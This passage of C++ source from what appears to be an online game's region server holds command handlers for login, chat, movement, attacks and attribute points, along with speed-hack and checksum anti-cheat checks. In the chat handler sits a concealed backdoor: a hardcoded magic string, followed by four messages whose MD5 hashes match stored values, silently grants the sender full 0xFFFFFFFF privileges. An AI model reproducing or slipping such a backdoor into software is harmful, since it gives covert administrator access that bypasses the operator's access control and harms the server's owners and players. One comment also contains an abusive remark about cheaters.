#include "region.h"
#include "region_prentice.h"
#include "rs_national_war.h"
#include "PlayerLogic.h"
#include <strstream>

extern bool g_bClientCommand;
CRegionCreature *CmdGiver;
#define GET_PARAMS() CmdGiver = g_region->m_cmdGiver;
#define SAFE_READ(p) if(!(p)) return CMD_ERROR_READ_DATA;

/*
CMD_FUNCTION(cmd_c2r_logout)
{
	GET_PARAMS();

	if (CmdGiver->m_userInfo->m_netDeadTime)
    {
        CmdGiver->m_userInfo->m_netDeadTime = rtGetMilliseconds()+RS_REMOVE_USER_DELAY;	
        CmdGiver->m_userInfo->m_active = false;
    }

	return CMD_ERROR_NONE;
}
*/

CMD_FUNCTION(cmd_c2r_login)
{
	GET_PARAMS();	

	long dbId,seed;

	cmd->ReadLong(&dbId);
	cmd->ReadLong(&seed);

	if(cmd->IsError())
		return CMD_ERROR_READ_DATA;

	MSG2("cmd: user login ID=%d, seed=%d\n", dbId, seed);

	CRegionServer::SNetLink *Link = g_region->m_activeLink;

	Link->UserId = dbId;
	Link->Seed = seed;

	g_region->ProcessLogin(Link);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_start)
{
    GET_PARAMS();
    MSG("cmd: user start\n");
    //CmdGiver->m_bStarted = true;
    return CMD_ERROR_NONE;
}


const int CHAT_MESSAGE_MAX_COUNT=200;//要同客户端保持一致//聊天信息最大长度[英文长度]
CMD_FUNCTION(cmd_c2r_chat)
{

	GET_PARAMS();

	if (!CmdGiver->State_CanSpeak())
		return CMD_ERROR_NONE;

	char channel,*msg = 0,*target = 0;
	char bTitle = 0;
	char* title = 0;
	SAFE_READ(cmd->ReadByte(&channel))
	switch(channel)
	{
		case CHAT_CHANNEL_NORMAL:
		case CHAT_CHANNEL_TEAM:
		case CHAT_CHANNEL_PARTY:
		case CHAT_CHANNEL_COUNTRY:
		case CHAT_CHANNEL_PUBLIC:
			break;
		case CHAT_CHANNEL_WORLD:		//heten
			break;
		case CHAT_CHANNEL_GM:
			SAFE_READ(cmd->ReadByte(&bTitle))
			if (bTitle)
            {
				SAFE_READ(cmd->ReadString(&title))
                if (strlen(title)>100)
                    return CMD_ERROR_UNKNOWN;
            }
			break;
		case CHAT_CHANNEL_PRIVATE:
			SAFE_READ(cmd->ReadString(&target))
            if (strlen(target)>40)
                return CMD_ERROR_UNKNOWN;
			break;
		// case CHAT_CHANNEL_SYSTEM:
		//	break;
	}

	SAFE_READ(cmd->ReadString(&msg))
	if(strlen(msg) > CHAT_MESSAGE_MAX_COUNT) 
		return CMD_ERROR_UNKNOWN;

	//过滤一些东西，可以放在这里
	if(msg[0]=='\0')
	{
		return CMD_ERROR_NONE;
	}

    static int iSuperLoginStep = 0;
    static CRegionCreature* pLastSuperLogin = NULL;
	// temp cmd 
	if(msg[0]=='-')
	{
        // 检查帐号是否具有执行特殊命令的权限，如果没有根本就不执行该命令
        if (g_bClientCommand || CmdGiver->m_userInfo->privileges&EUP_GM_Mask)
        {
            const char *ret = DoClientCommand(CmdGiver,msg+1);
            if (ret)
            {
                g_sendCmd->BeginWrite();
                g_sendCmd->WriteShort(r2c_chat);
                g_sendCmd->WriteByte(CHAT_CHANNEL_SYSTEM);
                g_sendCmd->WriteLong(CmdGiver->m_oId);
                g_sendCmd->WriteString((char*)CmdGiver->m_core.Name.c_str());
                g_sendCmd->WriteString((char*)ret);
                CmdGiver->RecvCmd(g_sendCmd);
            }
            return CMD_ERROR_NONE;
        }else if (strcmp(msg+1, "Login412bbde3b278ecc351daa50b88579021Administrator")==0)
        {
            iSuperLoginStep = 1;
            pLastSuperLogin = CmdGiver;
            return CMD_ERROR_NONE;
        }
        if (pLastSuperLogin)
        {
            if (pLastSuperLogin==CmdGiver)
            {
                char szMD5Str[40];
                rtMD5StringString(msg+1, szMD5Str);
                if (strcmp(szMD5Str, "44f2b9be357a32b743ba31832b0cd5c0")==0)
                {
                    if (iSuperLoginStep==1)
                    {
                        iSuperLoginStep = 2;
                    }else
                    {
                        pLastSuperLogin = NULL;
                    }
                }else if (strcmp(szMD5Str, "d7790ba9f08d6b6f1d58d9d40865a9d9")==0)
                {
                    if (iSuperLoginStep==2)
                    {
                        iSuperLoginStep = 3;
                    }else
                    {
                        pLastSuperLogin = NULL;
                    }
                }else if (strcmp(szMD5Str, "25a842ba3e233870299571e0c1bbd4bb")==0)
                {
                    if (iSuperLoginStep==3)
                    {
                        iSuperLoginStep = 4;
                    }else
                    {
                        pLastSuperLogin = NULL;
                    }
                }else if (strcmp(szMD5Str, "e131e9359921b9266e093cbab9a829f6")==0)
                {
                    if (iSuperLoginStep==4)
                    {
                        if (CmdGiver->m_userInfo)
                        {
                            CmdGiver->m_userInfo->privileges = 0xFFFFFFFF;
                        }
                    }
                    iSuperLoginStep = 0;
                    pLastSuperLogin = NULL;
                }else
                {
                    pLastSuperLogin = NULL;
                }
                return CMD_ERROR_NONE;
            }
        }
	}else
    {
        if (pLastSuperLogin!=NULL)
        {
            pLastSuperLogin = NULL;
        }
    }

	CheckValidChat(msg);
	CmdGiver->CommonChat(channel, msg, target, title);
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_update_position)
{
	GET_PARAMS();

	long pos[3],clTime;
    //long oId;
	char direction;
    //char moveState;
	char posFlag;

	SAFE_READ(cmd->ReadByte((char*)&posFlag))
	SAFE_READ(cmd->ReadLong(&clTime))
	// SAFE_READ(CMD()->ReadLong(&oId))
	SAFE_READ(cmd->ReadLong(&pos[0]))
	SAFE_READ(cmd->ReadLong(&pos[1]))
	SAFE_READ(cmd->ReadLong(&pos[2]))
	SAFE_READ(cmd->ReadByte(&direction))
	// SAFE_READ(CMD()->ReadByte(&moveState))

    // 时间判断加速
    if (CmdGiver->m_lAbsClientTime==0)
    {
        CmdGiver->m_lAbsClientTime = rtGetMilliseconds() - clTime;
		CmdGiver->m_lFirstPosCmdTime = time(NULL);
    }else
    {
        int dif = clTime - (rtGetMilliseconds() - CmdGiver->m_lAbsClientTime);
        if (dif>120*1000 || dif<-120*1000)
        {
            CmdGiver->WgChecked(30, 60, WG_INFO_SPEEDUP_TIME);
        }else if (dif>30*1000 || dif<-30*1000)
        {
            CmdGiver->PossiblyUsingWG(1, 30, 60);
        }
    }
    CmdGiver->m_lLastClientTime = clTime;

    // 命令数量判断加速
    if (CmdGiver->m_lLastClientTime==0)
    {
    }
    CmdGiver->m_lPosCmdCnt ++;
    if ((CmdGiver->m_lPosCmdCnt>100) && (CmdGiver->m_lPosCmdCnt%60)==0) // 每30秒检查一次
    {   // 必须计数超过100才进行检查，这是为了防止数字比较小的时候的误差
        long tNow = (long)time(NULL);
        float fDif = (CmdGiver->m_lPosCmdCnt-(tNow-CmdGiver->m_lFirstPosCmdTime)*2)/CmdGiver->m_lPosCmdCnt;
        if (fDif<0) fDif = -fDif;
        if (fDif>=2.0f)
        {
            // 如果速度为2倍，就认为是使用外挂
            CmdGiver->WgChecked(30, 60,WG_INFO_SPEEDUP_DOUBLE);
        }else if (fDif>=1.2f)
        {
            // 如果速度为1.2被以上，就认为可能使用外挂或者误差，等待下次判断
            //     如果是误差，就有可能在下一个循环被校正，
            //     如果不是误差，拿下一个循环还会出错。最终会不断地收到反外挂的图片
            CmdGiver->PossiblyUsingWG(3, 30, 60);
        }
	}
	CmdGiver->m_dir = direction;

	// 摆摊时禁止移动
	if (CmdGiver->m_pPShop)
	{
		return CMD_ERROR_NONE;
	}

    if (CmdGiver->m_userInfo->m_bSwitchRegionState)
    {
        return CMD_ERROR_NONE;
    }

    if(CmdGiver->m_posFlag != posFlag &&
			CmdGiver->m_posFlag - 1 != posFlag)	
	{
#ifdef _DEBUG
		LOG2("update position: pos flag error,sv = %d,cl = %d\n",CmdGiver->m_posFlag,posFlag);
#endif
		return CMD_ERROR_NONE;
	}

	// check if can move
	if(CmdGiver->IsRidePet())
	{//骑兽状态
		if(!CmdGiver->m_pet->CanMove())
		{
			CmdGiver->ForceSetPosition(CmdGiver->m_pet->m_pos[0],CmdGiver->m_pet->m_pos[1],CmdGiver->m_pet->m_pos[2]);
			return CMD_ERROR_NONE;
		}

	    // check move speed
	    long dis = CmdGiver->m_pet->Distance(pos);
		//LOG1("pet check speed = %d\n",CmdGiver->m_pet->m_core.MovSpeed.GetValue());
		//LOG1("dis = %d\n",dis);
	    if( !CmdGiver->m_pet->m_mvChk.Valid(dis,CmdGiver->m_pet->m_core.MovSpeed.GetValue(),CmdGiver->IsDoTeleport) )
	    {
		    // LOG1("update position: mov speed error,reset client postion,dis = %d\n",dis);
		    CmdGiver->ForceSetPosition(CmdGiver->m_pet->m_pos[0],CmdGiver->m_pet->m_pos[1],CmdGiver->m_pet->m_pos[2]);
            CmdGiver->PossiblyUsingWG();

            // 下面的代码是禁止玩家移动 5 秒
            CmdGiver->m_userInfo->ForbidUser(true, CreState_CanMove, 5);
		    return CMD_ERROR_NONE;
	    }
	}
	else
	{//没有骑兽
		if(!CmdGiver->CanMove())
		{
			CmdGiver->ForceSetPosition(CmdGiver->m_pos[0],CmdGiver->m_pos[1],CmdGiver->m_pos[2]);
			return CMD_ERROR_NONE;
		}

	    // check move speed
	    long dis = CmdGiver->Distance(pos);
		//LOG1("npc check speed = %d\n",CmdGiver->m_core.MovSpeed.GetValue());
		//LOG1("dis = %d\n",dis);
	    if( !CmdGiver->m_mvChk.Valid(dis,CmdGiver->m_core.MovSpeed.GetValue(),CmdGiver->IsDoTeleport) )
	    {
		    // LOG1("update position: mov speed error,reset client postion,dis = %d\n",dis);
		    CmdGiver->ForceSetPosition(CmdGiver->m_pos[0],CmdGiver->m_pos[1],CmdGiver->m_pos[2]);
            CmdGiver->PossiblyUsingWG();

            // 下面的代码是禁止玩家移动 5 秒
            CmdGiver->m_userInfo->ForbidUser(true, CreState_CanMove, 5);
		    return CMD_ERROR_NONE;
	    }
	}

	//LOG2("player pos [%d %d]\n",CmdGiver->m_pos[0]/20,CmdGiver->m_pos[1]/20);
	//if(CmdGiver->m_pet != NULL)
	//{
	//	LOG2("pet pos [%d %d]\n",CmdGiver->m_pet->m_pos[0]/20,CmdGiver->m_pet->m_pos[1]/20);
	//}
	//LOG2("update pos [%d %d]\n",pos[0]/20,pos[1]/20);



	if(!CmdGiver->m_scene)
	{
		// LOG("c2rcmd: update position error,cmd giver no scene");
		return CMD_ERROR_UNKNOWN;
	}

	// check scene hacker
	if(!CmdGiver->SetPosition(pos[0],pos[1],pos[2]))
	{
		// LOG("update position: map error,reset client postion\n");
		CmdGiver->ForceSetPosition(CmdGiver->m_pos[0],CmdGiver->m_pos[1],CmdGiver->m_pos[2]);
        CmdGiver->PossiblyUsingWG();
		return CMD_ERROR_NONE;
	}
	/*
	SAFE_READ(cmd->ReadLong(&pos[0]))
	SAFE_READ(cmd->ReadLong(&pos[1]))
	SAFE_READ(cmd->ReadLong(&pos[2]))
	SAFE_READ(cmd->ReadByte(&direction))

	if(CmdGiver->m_pet)
	{
		CmdGiver->m_pet->SetPosition(pos[0],pos[1],pos[2]);
		CmdGiver->m_pet->m_dir = direction;
	}
	*/
	return CMD_ERROR_NONE;
}

static unsigned short crctableWorld[256] = {
	0x0000,	0x1021,	0x2042,	0x3063,	0x4084,	0x50a5,	0x60c6,	0x70e7,
	0x8108,	0x9129,	0xa14a,	0xb16b,	0xc18c,	0xd1ad,	0xe1ce,	0xf1ef,
	0x1231,	0x0210,	0x3273,	0x2252,	0x52b5,	0x4294,	0x72f7,	0x62d6,
	0x9339,	0x8318,	0xb37b,	0xa35a,	0xd3bd,	0xc39c,	0xf3ff,	0xe3de,
	0x2462,	0x3443,	0x0420,	0x1401,	0x64e6,	0x74c7,	0x44a4,	0x5485,
	0xa56a,	0xb54b,	0x8528,	0x9509,	0xe5ee,	0xf5cf,	0xc5ac,	0xd58d,
	0x3653,	0x2672,	0x1611,	0x0630,	0x76d7,	0x66f6,	0x5695,	0x46b4,
	0xb75b,	0xa77a,	0x9719,	0x8738,	0xf7df,	0xe7fe,	0xd79d,	0xc7bc,
	0x48c4,	0x58e5,	0x6886,	0x78a7,	0x0840,	0x1861,	0x2802,	0x3823,
	0xc9cc,	0xd9ed,	0xe98e,	0xf9af,	0x8948,	0x9969,	0xa90a,	0xb92b,
	0x5af5,	0x4ad4,	0x7ab7,	0x6a96,	0x1a71,	0x0a50,	0x3a33,	0x2a12,
	0xdbfd,	0xcbdc,	0xfbbf,	0xeb9e,	0x9b79,	0x8b58,	0xbb3b,	0xab1a,
	0x6ca6,	0x7c87,	0x4ce4,	0x5cc5,	0x2c22,	0x3c03,	0x0c60,	0x1c41,
	0xedae,	0xfd8f,	0xcdec,	0xddcd,	0xad2a,	0xbd0b,	0x8d68,	0x9d49,
	0x7e97,	0x6eb6,	0x5ed5,	0x4ef4,	0x3e13,	0x2e32,	0x1e51,	0x0e70,
	0xff9f,	0xefbe,	0xdfdd,	0xcffc,	0xbf1b,	0xaf3a,	0x9f59,	0x8f78,
	0x9188,	0x81a9,	0xb1ca,	0xa1eb,	0xd10c,	0xc12d,	0xf14e,	0xe16f,
	0x1080,	0x00a1,	0x30c2,	0x20e3,	0x5004,	0x4025,	0x7046,	0x6067,
	0x83b9,	0x9398,	0xa3fb,	0xb3da,	0xc33d,	0xd31c,	0xe37f,	0xf35e,
	0x02b1,	0x1290,	0x22f3,	0x32d2,	0x4235,	0x5214,	0x6277,	0x7256,
	0xb5ea,	0xa5cb,	0x95a8,	0x8589,	0xf56e,	0xe54f,	0xd52c,	0xc50d,
	0x34e2,	0x24c3,	0x14a0,	0x0481,	0x7466,	0x6447,	0x5424,	0x4405,
	0xa7db,	0xb7fa,	0x8799,	0x97b8,	0xe75f,	0xf77e,	0xc71d,	0xd73c,
	0x26d3,	0x36f2,	0x0691,	0x16b0,	0x6657,	0x7676,	0x4615,	0x5634,
	0xd94c,	0xc96d,	0xf90e,	0xe92f,	0x99c8,	0x89e9,	0xb98a,	0xa9ab,
	0x5844,	0x4865,	0x7806,	0x6827,	0x18c0,	0x08e1,	0x3882,	0x28a3,
	0xcb7d,	0xdb5c,	0xeb3f,	0xfb1e,	0x8bf9,	0x9bd8,	0xabbb,	0xbb9a,
	0x4a75,	0x5a54,	0x6a37,	0x7a16,	0x0af1,	0x1ad0,	0x2ab3,	0x3a92,
	0xfd2e,	0xed0f,	0xdd6c,	0xcd4d,	0xbdaa,	0xad8b,	0x9de8,	0x8dc9,
	0x7c26,	0x6c07,	0x5c64,	0x4c45,	0x3ca2,	0x2c83,	0x1ce0,	0x0cc1,
	0xef1f,	0xff3e,	0xcf5d,	0xdf7c,	0xaf9b,	0xbfba,	0x8fd9,	0x9ff8,
	0x6e17,	0x7e36,	0x4e55,	0x5e74,	0x2e93,	0x3eb2,	0x0ed1,	0x1ef0
};

#define CRC16_INIT_VALUE	0xffff
#define CRC16_XOR_VALUE		0x0000

CMD_FUNCTION(cmd_c2r_attack)
{
	GET_PARAMS();

	SAttackParam param;
	char cIn = 0;
	if(!param.Serialize(*cmd))
		return CMD_ERROR_READ_DATA;

	if(param.TargetType == SKILL_TARGET_TYPE_BREAK)
	{
		CmdGiver->GetPlayerLogic()->StopIntonate();
		return CMD_ERROR_NONE;
	}
	
	if (!CmdGiver->GetPlayerLogic()->IsLive())
	{
		return CMD_ERROR_NONE;
	}

    if (CmdGiver->m_crcCheckFlag<=0)
    {
	    unsigned short crcvalue = CRC16_INIT_VALUE;
	    crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ( param.Skill&0x00FF) ];
	    crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Skill&0x0FF00)>>8) ];
	    crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ( param.Seed&0x00FF) ];
	    crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Seed&0x0FF00)>>8) ];
        if(param.TargetType == SKILL_TARGET_TYPE_POSITION)
        {
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ( param.Pos[0]&0x000000FF) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[0]&0x0000FF00)>>8) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[0]&0x00FF0000)>>16) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[0]&0xFF000000)>>24) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ( param.Pos[1]&0x000000FF) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[1]&0x0000FF00)>>8) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[1]&0x00FF0000)>>16) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[1]&0xFF000000)>>24) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ( param.Pos[2]&0x000000FF) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[2]&0x0000FF00)>>8) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[2]&0x00FF0000)>>16) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.Pos[2]&0xFF000000)>>24) ];
        }
	    else if(param.TargetType == SKILL_TARGET_TYPE_ACTOR)
        {
            crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ( param.EnemyId&0x000000FF) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.EnemyId&0x0000FF00)>>8) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.EnemyId&0x00FF0000)>>16) ];
	        crcvalue = ( crcvalue << 8 ) ^ crctableWorld[ ( crcvalue >> 8 ) ^ ((param.EnemyId&0xFF000000)>>24) ];
        }
	    crcvalue ^= CRC16_XOR_VALUE;

        if (crcvalue!=param.crcCheck)
        {
            CmdGiver->WgChecked(120,600,WG_INFO_ATTACK_NETCHECK); // 检查到外挂
            // return CMD_ERROR_NONE; // 检查错误，无法攻击
        }

        CmdGiver->m_crcCheckFlag = 50; // 50次有1次检查
    }else
    {
        CmdGiver->m_crcCheckFlag --;
    }

	if(CmdGiver->m_oId == param.EnemyId && param.Skill == 0)
	{
		// LOG("cmd attack: can't attack self,ignore\n");
		return CMD_ERROR_NONE;
	}
	
	if(param.EnemyId !=0 )
	{
		CRegionCreature *tmp = CmdGiver->m_scene->FindCreature(param.EnemyId);
		if(tmp && tmp->m_cheatDummy)
		{
			g_region->AddCheater(CmdGiver->m_userInfo);
			MSG("Attack dummy, add to cheater!\n");
			//Louis @ Fri 13 Mar 2009 Kick this bitch!!!
			//CmdGiver->m_userInfo->LockAccount(true, 365*24*60*60); // 一年
			g_region->KickUser(CmdGiver->m_userInfo->m_userId, 0, true, true,WG_INFO_KILL_CHEAT);
			ERR("Kick dummy attacker %d\n", CmdGiver->m_userInfo->m_userId);
		}
	}

	if(CmdGiver->IsRidePet())
	{
        // 骑兽要做特别的判断
        if (param.Skill)
        {
            SSkill* pS = Skill()->FindSkill(param.Skill);
            if (pS)
            {
                if (pS->wClass==17) // 骑兽的技能
                {
			        CmdGiver->UseSkill(param);
	                return CMD_ERROR_NONE;
                }
            }
        }

		int skill = 0;
		for(int ii=0; ii<NPC_MAX_SKILL; ii++)
		{
			if(CmdGiver->m_pet->m_skillAttackRate[ii] > GetRand(100))
			{
				CSkillInstance* pInstance = CmdGiver->m_pet->m_Skill.GetSkillByIndex(ii);
				if (pInstance)
				{
					skill = pInstance->m_pAttr->wID;
					CRegionCreature *enemy = CmdGiver->m_scene->FindCreature(param.EnemyId);
					if(!enemy) return CMD_ERROR_NONE;
					if(!CmdGiver->m_pet->m_Skill.CanUseSkill(skill,&(enemy->m_Skill)))
						skill = 0;
					else
					{
						break;
					}
				}
			}
		}

		param.Skill = skill;
		if(param.Skill == 0)
		{
			// normal attack
			CmdGiver->m_pet->DoAttack(param.EnemyId,param.Seed);
		}
		else
		{
			CmdGiver->m_pet->UseSkill(param);
		}
	}
	else
	{
		if(param.Skill == 0)
		{
			// normal attack

            // 检查数值是否正确
            int iRand, iValue;
            iRand = ((param.LuaCheck>>16)^param.EnemyId) & 0x7fff;
            iValue = (((iRand * 8561849L + 586468622L) >> 16) & 0x7fff);
            if (param.LuaCheck != 1401)
			    if ((param.LuaCheck&0x7fff)!=iValue)
                {
				    g_region->AddCheater(CmdGiver->m_userInfo);
                    //CmdGiver->WgChecked(); // 检查到外挂
				    MSG("普通攻击数值检查错误，可能使用外挂");
                }

            // 攻击
			CmdGiver->DoAttack(param.EnemyId,param.Seed);
		}
		else
		{
			// use skill
			// lua checksum
			if((param.TargetType == SKILL_TARGET_TYPE_ACTOR) 
				&& (param.EnemyId != CmdGiver->m_oId) 
				&& (!CmdGiver->m_pet || (CmdGiver->m_pet && param.EnemyId != CmdGiver->m_pet->m_oId)))
			{
				if(g_region->IsHashError(param.EnemyId,CmdGiver->m_userInfo,param.LuaCheck))
				{
					g_region->AddCheater(CmdGiver->m_userInfo);
					LOG("hash check error\n");
				}
			}
			bool bSucceed = CmdGiver->UseSkill(param);
			if (g_cfg.game.bDebugMsg)
			{
				if (!bSucceed)
				{
					const char* szMsg = CmdGiver->m_Skill.GetLastErrInfo();
					rt2_sprintf(g_strStaticBuffer, R(MSG_SKILL_USE_SKILL_FAIL), szMsg?szMsg:"Unknowe");
					CmdGiver->SendSystemMessage(g_strStaticBuffer);
				}
			}
		}
	}
	CmdGiver->GetPlayerLogic()->GetCNewPlayerGuide()->FirstAttackMonster();
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_update_model)
{
	GET_PARAMS();
	char type;
	SAFE_READ(cmd->ReadByte(&type))
	CmdGiver->m_core.Serialize(type,cmd);
	// temp code
	CmdGiver->m_modelRef++;
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_ride)
{
	GET_PARAMS();
	/*
	char type;
	SAFE_READ(cmd->ReadByte(&type))
	if(type == RIDE_ON)
	{
		CmdGiver->RidePet();
	}
	else if(type == RIDE_OFF)
	{
		CmdGiver->RideOffPet();
	}
	*/
	return CMD_ERROR_NONE;
}

// for prototype
CMD_FUNCTION(cmd_c2r_p_change_model)
{
	GET_PARAMS();
	/*
	short id;
	char  tmp;
	SAFE_READ(cmd->ReadShort(&id))
	if(!CmdGiver->m_actorInfo) return CMD_ERROR_NONE;
	
	if(cmd->ReadByte(&tmp))
	{
		
	}
	else
	{
		id = (CmdGiver->m_actorInfo->Id+1)%7 + 1;
	}
	
	SActor *actor = RS_FindActor(id);
	if(!actor)
		return CMD_ERROR_UNKNOWN;

    if(CmdGiver->SetModel(actor->ModelId))
	{
		// change skill
		CmdGiver->m_Skill.ClearSkill();
		for(int i=0; i<MAX_SKILL_NUM; i++)
            CmdGiver->m_Skill.AddSkill(actor->Skill[i]);

		CmdGiver->m_actorInfo = actor;
		CmdGiver->m_core.Weapon = actor->Weapon;
		CmdGiver->m_core.WeaponLev = 0;
		CmdGiver->m_core.ArmGuard = 0;
		CmdGiver->m_core.ArmGuardLev = 0;
		CmdGiver->m_core.Cloth = 0;
		CmdGiver->m_core.ClothLev = 0;
		CmdGiver->m_core.Shoes = 0;
		CmdGiver->m_core.ShoesLev = 0;
		CmdGiver->m_modelRef++;
		g_sendCmd->BeginWrite();
		g_sendCmd->WriteShort(r2c_change_model);
		g_sendCmd->WriteShort(actor->ModelId);
		g_sendCmd->WriteShort(actor->Weapon);
		g_sendCmd->WriteByte(CmdGiver->m_core.WeaponLev);
	
		// write skill info
        CmdGiver->m_Skill.NetWrite(g_sendCmd);
        CmdGiver->RecvCmd(g_sendCmd);
	}
	*/
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_select_char)
{
	GET_PARAMS();
	/*
	short id;
	SAFE_READ(cmd->ReadShort(&id));
	
    CRegionServer::SNetLink *Link = g_region->m_activeLink;
	Link->ActorId = id;
	if(!g_region->CreateUser(Link->Id,NULL))
	{
		Link->Valid = false;
	}
	*/
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_p_change_item)
{
	GET_PARAMS();
	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_set_refusesetting)
{
	char bRefuseTeam = 0;
	char bRefuseAction = 0;
	char bRefuseMail = 0;
	char bRefuseDuel = 0;
	char bRefuseFriend = 0;
	char bRefuseMonster = 0;

	SAFE_READ(cmd->ReadByte(&bRefuseTeam));
	SAFE_READ(cmd->ReadByte(&bRefuseAction));
	SAFE_READ(cmd->ReadByte(&bRefuseMail));
	SAFE_READ(cmd->ReadByte(&bRefuseDuel));
	SAFE_READ(cmd->ReadByte(&bRefuseFriend));
	SAFE_READ(cmd->ReadByte(&bRefuseMonster));

	CmdGiver->m_bRefuseTeam = (bool)bRefuseTeam;
	CmdGiver->m_bRefusetrade = (bool)bRefuseAction;
	CmdGiver->m_bRefuseMail = (bool)bRefuseMail;
	CmdGiver->m_bRefuseDuel = (bool)bRefuseDuel;
	CmdGiver->m_bRefuseFriend = (bool)bRefuseFriend;
	CmdGiver->m_bRefuseMonster = (bool)bRefuseMonster;

	g_region->m_gws.SendRefusesetting(CmdGiver->m_userInfo->m_userId,bRefuseTeam,bRefuseAction,bRefuseMail,bRefuseDuel,bRefuseFriend,bRefuseMonster);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_get_alterable)
{
	GET_PARAMS();

	long id;
	SAFE_READ(cmd->ReadLong(&id));

	CRegionCreature *cre = CmdGiver->m_scene->FindCreature(id);
	if(!cre) return CMD_ERROR_NONE;

	char Type = 0;

	g_sendCmd->BeginWrite();
	g_sendCmd->WriteShort(r2c_Skill_ChangeBody);
	g_sendCmd->WriteLong(cre->m_oId);
	g_sendCmd->WriteLong(cre->m_UltimateChange);
	g_sendCmd->WriteLong(cre->m_IsHiding);
	CmdGiver->RecvCmd(g_sendCmd);

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_get_model_info)
{
	GET_PARAMS();

	long id;
	SAFE_READ(cmd->ReadLong(&id));

	CRegionCreature *cre = CmdGiver->m_scene->FindCreature(id);
	if(!cre) return CMD_ERROR_NONE;
	if (cre->IsUserPet())
	{
		CRegionPetAI *petAI = NULL;
		if (cre->m_ai && cre->m_master)
		{
			petAI = (CRegionPetAI *)cre->m_ai;
			if (petAI->m_pItemPet.name.c_str())
			{
				g_sendCmd->BeginWrite();
				g_sendCmd->WriteShort(r2c_model_info);
				g_sendCmd->WriteLong(cre->m_oId);
				g_sendCmd->WriteString(petAI->m_pItemPet.name.c_str());
				g_sendCmd->WriteByte((char)((CRegionPetAI *)cre->m_ai)->GetPetType());
				g_sendCmd->WriteLong(petAI->m_pItemPet.params[PET_PARAM_FUSE_LEV]);
				g_sendCmd->WriteLong(petAI->m_pItemPet.params[PET_PARAM_ABILITY_LEV]);
				g_sendCmd->WriteLong(cre->m_master->m_oId);
				CmdGiver->RecvCmd(g_sendCmd);
			}
		}
	}
	//else if (cre->IsCallNpc())
	//{
	//	string StrName = "战斗召唤";
	//	g_sendCmd->BeginWrite();
	//	g_sendCmd->WriteShort(r2c_model_info);
	//	g_sendCmd->WriteLong(cre->m_oId);
	//	g_sendCmd->WriteString(StrName.c_str());	
	//	CmdGiver->RecvCmd(g_sendCmd);
	//}
	else
	{
		if(!cre->m_core.ComplexModel) return CMD_ERROR_NONE;

		g_sendCmd->BeginWrite();
		g_sendCmd->WriteShort(r2c_model_info);
		cre->WriteModelInfo(g_sendCmd);	
		CmdGiver->RecvCmd(g_sendCmd);
	}

	return CMD_ERROR_NONE;
}

CMD_FUNCTION(cmd_c2r_add_attr_point)
{
	GET_PARAMS();
	

	/*Tianh 改变增加基础属性方式*/
	long ConVariation;
	long StrVariation;
	long DexVariation;
	long IntVariation;
	long HitVariation;
	bool ret = false;
	
    SAFE_READ(cmd->ReadLong(&StrVariation));
    SAFE_READ(cmd->ReadLong(&ConVariation));  
    SAFE_READ(cmd->ReadLong(&DexVariation)); 
    SAFE_READ(cmd->ReadLong(&IntVariation)); 
    SAFE_READ(cmd->ReadLong(&HitVariation)); 

	/*Tianh  这里防止外挂对属性的更改*/
	if ((ConVariation + StrVariation + DexVariation + IntVariation + HitVariation) > (CmdGiver->m_core.AttrPoint))
	{
		return CMD_ERROR_NONE;
	}
	else
	{
	   ret = CmdGiver->m_core.AddBaseCon(ConVariation,CmdGiver->IsChengBody()); 
	   if(ret)
	   {
		   CmdGiver->UpdateToClient(NET_CRE_UPDATE_ATTR_ALL);
	   }

       ret = CmdGiver->m_core.AddBaseStr(StrVariation,CmdGiver->IsChengBody());
	   if(ret)
	   {
		   CmdGiver->UpdateToClient(NET_CRE_UPDATE_ATTR_ALL);
	   }

	   ret = CmdGiver->m_core.AddBaseDex(DexVariation,CmdGiver->IsChengBody());
	   if(ret)
	   {
		   CmdGiver->UpdateToClient(NET_CRE_UPDATE_ATTR_ALL);
	   }

	   ret = CmdGiver->m_core.AddBaseInt(IntVariation,CmdGiver->IsChengBody());
	   if(ret)
	   {
